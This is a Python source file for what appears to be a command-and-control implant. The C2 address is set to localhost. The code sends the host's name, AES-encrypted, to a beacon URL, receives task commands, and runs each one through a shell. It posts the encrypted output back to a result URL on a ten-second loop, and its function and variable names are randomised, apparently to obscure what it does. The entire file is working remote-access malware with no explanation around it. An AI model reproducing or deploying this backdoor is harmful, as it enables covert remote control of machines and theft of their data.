
import requests
import socket
import time
import subprocess
import json
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_encrypt

C2_URL = "http://localhost:8080/beacon"
RESULT_URL = "http://localhost:8080/result"

def cbJRlvRo():
    OkuSmOBz = socket.gethostname()

    while True:
        oMUpaNkM = {
            "hostname": OkuSmOBz,
            "payload": "idle"
        }

        try:
            JEfeZvmb = json.dumps(oMUpaNkM)
            YJVlwiAk = aes_encrypt(JEfeZvmb)
            aYJgBSaf = requests.post(C2_URL, data=YJVlwiAk.encode(), timeout=5)

            if aYJgBSaf.status_code == 200:
                fKOgihRj = aYJgBSaf.json()
                ARoGPmtV = fKOgihRj.get("tasks", [])

                for jWOPdDzS in ARoGPmtV:
                    print(f"[+] Executing: {jWOPdDzS}")
                    try:
                        OeECkDnH = subprocess.check_output(jWOPdDzS, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        CcNLctPs = OeECkDnH.decode().strip()
                    except subprocess.CalledProcessError as e:
                        CcNLctPs = f"[!] Command failed: {e.output.decode().strip()}"

                    print(f"[>] Sending result:\n{CcNLctPs}")

                    RVaVbBnk = {
                        "hostname": OkuSmOBz,
                        "command": jWOPdDzS,
                        "result": CcNLctPs
                    }
                    cuXNZkve = aes_encrypt(json.dumps(RVaVbBnk))
                    requests.post(RESULT_URL, data=cuXNZkve.encode())

        except Exception as e:
            print(f"[!] Beacon failed: {e}")

        time.sleep(10)

if __name__ == "__main__":
    cbJRlvRo()
